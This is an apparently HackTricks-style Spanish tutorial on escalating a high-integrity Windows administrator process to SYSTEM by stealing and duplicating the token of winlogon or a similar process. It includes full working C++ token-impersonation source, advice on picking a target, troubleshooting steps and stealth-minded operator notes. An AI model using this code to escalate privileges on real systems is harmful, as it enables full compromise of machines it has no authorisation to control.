# SeImpersonate de High a System

{{#include ../../banners/hacktricks-training.md}}

Esta página trata sobre la versión **manual** de pasar de un **proceso de administrador con integridad alta** a **`NT AUTHORITY\SYSTEM`** mediante la **apertura de un proceso SYSTEM no protegido, la duplicación de su token y la creación de un proceso hijo con ese token**.

Si solo tienes **`SeImpersonatePrivilege`** / **`SeAssignPrimaryTokenPrivilege`** pero **no puedes abrir un proceso SYSTEM adecuado**, la ruta de **Potato / named-pipe** suele ser más fiable:

{{#ref}}
named-pipe-client-impersonation.md
{{#endref}}

{{#ref}}
roguepotato-and-printspoofer.md
{{#endref}}

Si lo que quieres no es solo obtener `SYSTEM`, sino un **token SYSTEM con tantos privilegios como sea posible**, consulta también:

{{#ref}}
sedebug-+-seimpersonate-copy-token.md
{{#endref}}

## Triaje rápido

Antes de intentar robar un token, valida rápidamente el contexto:
```cmd
whoami /groups | findstr /i "high mandatory"
whoami /priv | findstr /i "SeDebugPrivilege SeImpersonatePrivilege SeAssignPrimaryTokenPrivilege"
```
Notas prácticas:

- Un token de administrador con **High Integrity** suele ser suficiente para **habilitar `SeDebugPrivilege`** y abrir muchos procesos SYSTEM no protegidos.
- **`CreateProcessWithTokenW` requiere `SeImpersonatePrivilege`** en el caller. Si esa API falla con `1314`, cambia a `CreateProcessAsUserW` después de haber duplicado un token primario de SYSTEM.
- En versiones modernas de Windows, **`lsass.exe` suele ser un objetivo inadecuado** porque **LSA protection / PPL** bloquea el acceso incluso a administradores con `SeDebugPrivilege`. Prefiere **`winlogon.exe`**, **`wininit.exe`**, **`services.exe`** o un **`svchost.exe`** inicial que se ejecute como SYSTEM.
- No todos los procesos SYSTEM tienen un token igual de útil. Si obtienes SYSTEM pero observas que faltan privilegios, prueba con otro proceso SYSTEM en lugar de asumir que la técnica está rota.

## Elige el PID cuidadosamente

La forma más sencilla de hacer que esto funcione de manera fiable es **elegir un proceso SYSTEM cuya DACL permita realmente a Administrators consultar el proceso y duplicar su token**.

Buenos candidatos para probar primero:

- `winlogon.exe`
- `wininit.exe`
- `services.exe`
- algunas instancias iniciales de `svchost.exe` que se ejecuten como SYSTEM

Evita por defecto:

- `lsass.exe` en hosts donde **RunAsPPL / LSA protection** esté habilitado
- procesos protegidos o sensibles para la seguridad que devuelvan `Access denied` incluso después de habilitar `SeDebugPrivilege`

Puedes inspeccionar los procesos candidatos y sus token/ACLs con **Process Explorer** o **Process Hacker** ejecutándose con privilegios elevados.

### Código

El siguiente código proviene de [este artículo sobre access tokens](https://medium.com/@seemant.bisht24/understanding-and-abusing-access-tokens-part-ii-b9069f432962). Acepta un **ID de proceso como argumento** e inicia un command shell **como el usuario** de ese proceso.<sup>[[3]](#references)</sup>\
Al ejecutarse en un proceso con High Integrity, puedes **indicar el PID de un proceso que se ejecute como System** (como `winlogon`, `wininit`) y ejecutar un `cmd.exe` como SYSTEM.<sup>[[3]](#references)</sup>
```cpp
impersonateuser.exe 1234
```

```cpp:impersonateuser.cpp
// From https://securitytimes.medium.com/understanding-and-abusing-access-tokens-part-ii-b9069f432962

#include <windows.h>
#include <iostream>
#include <Lmcons.h>
BOOL SetPrivilege(
HANDLE hToken,          // access token handle
LPCTSTR lpszPrivilege,  // name of privilege to enable/disable
BOOL bEnablePrivilege   // to enable or disable privilege
)
{
TOKEN_PRIVILEGES tp;
LUID luid;
if (!LookupPrivilegeValue(
NULL,            // lookup privilege on local system
lpszPrivilege,   // privilege to lookup
&luid))        // receives LUID of privilege
{
printf("[-] LookupPrivilegeValue error: %u\n", GetLastError());
return FALSE;
}
tp.PrivilegeCount = 1;
tp.Privileges[0].Luid = luid;
if (bEnablePrivilege)
tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
else
tp.Privileges[0].Attributes = 0;
// Enable the privilege or disable all privileges.
if (!AdjustTokenPrivileges(
hToken,
FALSE,
&tp,
sizeof(TOKEN_PRIVILEGES),
(PTOKEN_PRIVILEGES)NULL,
(PDWORD)NULL))
{
printf("[-] AdjustTokenPrivileges error: %u\n", GetLastError());
return FALSE;
}
if (GetLastError() == ERROR_NOT_ALL_ASSIGNED)
{
printf("[-] The token does not have the specified privilege. \n");
return FALSE;
}
return TRUE;
}
std::string get_username()
{
TCHAR username[UNLEN + 1];
DWORD username_len = UNLEN + 1;
GetUserName(username, &username_len);
std::wstring username_w(username);
std::string username_s(username_w.begin(), username_w.end());
return username_s;
}
int main(int argc, char** argv) {
// Print whoami to compare to thread later
printf("[+] Current user is: %s\n", (get_username()).c_str());
// Grab PID from command line argument
char* pid_c = argv[1];
DWORD PID_TO_IMPERSONATE = atoi(pid_c);
// Initialize variables and structures
HANDLE tokenHandle = NULL;
HANDLE duplicateTokenHandle = NULL;
STARTUPINFO startupInfo;
PROCESS_INFORMATION processInformation;
ZeroMemory(&startupInfo, sizeof(STARTUPINFO));
ZeroMemory(&processInformation, sizeof(PROCESS_INFORMATION));
startupInfo.cb = sizeof(STARTUPINFO);
// Add SE debug privilege
HANDLE currentTokenHandle = NULL;
BOOL getCurrentToken = OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES, &currentTokenHandle);
if (SetPrivilege(currentTokenHandle, L"SeDebugPrivilege", TRUE))
{
printf("[+] SeDebugPrivilege enabled!\n");
}
// Call OpenProcess(), print return code and error code
HANDLE processHandle = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, true, PID_TO_IMPERSONATE);
if (GetLastError() == NULL)
printf("[+] OpenProcess() success!\n");
else
{
printf("[-] OpenProcess() Return Code: %i\n", processHandle);
printf("[-] OpenProcess() Error: %i\n", GetLastError());
}
// Call OpenProcessToken(), print return code and error code
BOOL getToken = OpenProcessToken(processHandle, MAXIMUM_ALLOWED, &tokenHandle);
if (GetLastError() == NULL)
printf("[+] OpenProcessToken() success!\n");
else
{
printf("[-] OpenProcessToken() Return Code: %i\n", getToken);
printf("[-] OpenProcessToken() Error: %i\n", GetLastError());
}
// Impersonate user in a thread
BOOL impersonateUser = ImpersonateLoggedOnUser(tokenHandle);
if (GetLastError() == NULL)
{
printf("[+] ImpersonatedLoggedOnUser() success!\n");
printf("[+] Current user is: %s\n", (get_username()).c_str());
printf("[+] Reverting thread to original user context\n");
RevertToSelf();
}
else
{
printf("[-] ImpersonatedLoggedOnUser() Return Code: %i\n", getToken);
printf("[-] ImpersonatedLoggedOnUser() Error: %i\n", GetLastError());
}
// Call DuplicateTokenEx(), print return code and error code
BOOL duplicateToken = DuplicateTokenEx(tokenHandle, MAXIMUM_ALLOWED, NULL, SecurityImpersonation, TokenPrimary, &duplicateTokenHandle);
if (GetLastError() == NULL)
printf("[+] DuplicateTokenEx() success!\n");
else
{
printf("[-] DuplicateTokenEx() Return Code: %i\n", duplicateToken);
printf("[-] DupicateTokenEx() Error: %i\n", GetLastError());
}
// Call CreateProcessWithTokenW(), print return code and error code
BOOL createProcess = CreateProcessWithTokenW(duplicateTokenHandle, LOGON_WITH_PROFILE, L"C:\\Windows\\System32\\cmd.exe", NULL, 0, NULL, NULL, &startupInfo, &processInformation);
if (GetLastError() == NULL)
printf("[+] Process spawned!\n");
else
{
printf("[-] CreateProcessWithTokenW Return Code: %i\n", createProcess);
printf("[-] CreateProcessWithTokenW Error: %i\n", GetLastError());
}
return 0;
}
```
## Notas útiles sobre API / derechos de acceso

El ejemplo usa `MAXIMUM_ALLOWED`, pero para operaciones reales es útil recordar los componentes mínimos implicados:

- `OpenProcessToken()` solo requiere que el **handle del proceso** se haya abierto con **`PROCESS_QUERY_LIMITED_INFORMATION`**.
- Para usar `CreateProcessWithTokenW()`, el **handle del token primario** debe tener **`TOKEN_QUERY | TOKEN_DUPLICATE | TOKEN_ASSIGN_PRIMARY`**.<sup>[[1]](#references)</sup>
- `DuplicateTokenEx()` debe crear un **token primario** (`TokenPrimary`), no únicamente un token de impersonation.
- Si ya has hecho impersonation de SYSTEM y `CreateProcessWithTokenW()` sigue fallando con `1314`, prueba `CreateProcessAsUserW()` en su lugar.

Esto significa que **abrir el proceso objetivo con `PROCESS_ALL_ACCESS` normalmente es innecesario y genera más ruido** que solicitar únicamente los derechos necesarios para consultar el token.

## Error

En algunas ocasiones puedes intentar hacer impersonation de System y no funcionará, mostrando una salida como la siguiente:
```cpp
[+] OpenProcess() success!
[+] OpenProcessToken() success!
[-] ImpersonatedLoggedOnUser() Return Code: 1
[-] ImpersonatedLoggedOnUser() Error: 5
[-] DuplicateTokenEx() Return Code: 0
[-] DupicateTokenEx() Error: 5
[-] CreateProcessWithTokenW Return Code: 0
[-] CreateProcessWithTokenW Error: 1326
```
Esto significa que, aunque estés ejecutando con un nivel de integridad **High**, **no tienes suficientes permisos** sobre ese proceso/token objetivo.\
Comprobemos los permisos actuales de Administrator sobre los procesos `svchost.exe` con **Process Explorer** (también puedes usar **Process Hacker**):

1. Selecciona un proceso `svchost.exe`
2. Haz clic derecho --> Properties
3. Dentro de la pestaña "Security", haz clic en el botón "Permissions", situado en la esquina inferior derecha
4. Haz clic en "Advanced"
5. Selecciona "Administrators" y haz clic en "Edit"
6. Haz clic en "Show advanced permissions"

![Code - Error: 6. Haz clic en "Show advanced permissions"](<../../images/image (437).png>)

La imagen anterior contiene todos los privilegios que "Administrators" tienen sobre el proceso seleccionado (como puedes ver, en el caso de `svchost.exe` solo tienen privilegios de "Query").

Consulta los privilegios que "Administrators" tienen sobre `winlogon.exe`:

![Code - Error: Consulta los privilegios que "Administrators" tienen sobre winlogon.exe](<../../images/image (1102).png>)

Dentro de ese proceso, "Administrators" pueden "Read Memory" y "Read Permissions", lo que probablemente permite a Administrators impersonar el token utilizado por este proceso.

### Causas comunes de errores

- **`OpenProcess()` / `OpenProcessToken()` -> `5 (Access denied)`**: la DACL del proceso te bloquea o el objetivo está **protegido/PPL**. Elige otro proceso SYSTEM.
- **`DuplicateTokenEx()` -> `5 (Access denied)`**: el handle de tu token se abrió sin suficientes derechos o la DACL del token objetivo impide la duplicación.
- **`CreateProcessWithTokenW()` -> `1314`**: el caller no tiene actualmente habilitado **`SeImpersonatePrivilege`**. Intenta habilitarlo primero o utiliza `CreateProcessAsUserW()` con el primary token duplicado.
- **`CreateProcessWithTokenW()` -> `1326`** después de errores anteriores: normalmente esto solo significa que el paso anterior de duplicación/impersonation del token falló, por lo que no existe ningún primary token utilizable para iniciar el proceso hijo.

## Notas del operador

- Esta técnica es excelente cuando ya eres **local admin + high integrity** y solo quieres una ruta manual y rápida hacia SYSTEM sin iniciar un servicio ni ejecutar una cadena de coerción mediante named pipes.
- En entornos Windows 11 / Server hardened, la **protección de LSA es cada vez más común**, por lo que un workflow que asuma que `lsass.exe` siempre es legible resulta poco fiable. **`winlogon.exe` / `wininit.exe` / `services.exe` suelen ser mejores opciones iniciales**.<sup>[[2]](#references)</sup>
- Si obtienes un contexto de **service account** en lugar de un escritorio de administrador elevado, la **familia Potato** suele ser más adecuada que esta técnica.



## References

- [1] [Microsoft: CreateProcessWithTokenW](https://learn.microsoft.com/en-us/windows/win32/api/winbase/nf-winbase-createprocesswithtokenw)
- [2] [SensePost: Abusar de los tokens de Windows para comprometer Active Directory sin tocar LSASS](https://sensepost.com/blog/2022/abusing-windows-tokens-to-compromise-active-directory-without-touching-lsass/)
- [3] [Comprender y abusar de los tokens de proceso — Parte II](https://medium.com/@seemant.bisht24/understanding-and-abusing-access-tokens-part-ii-b9069f432962)
{{#include ../../banners/hacktricks-training.md}}
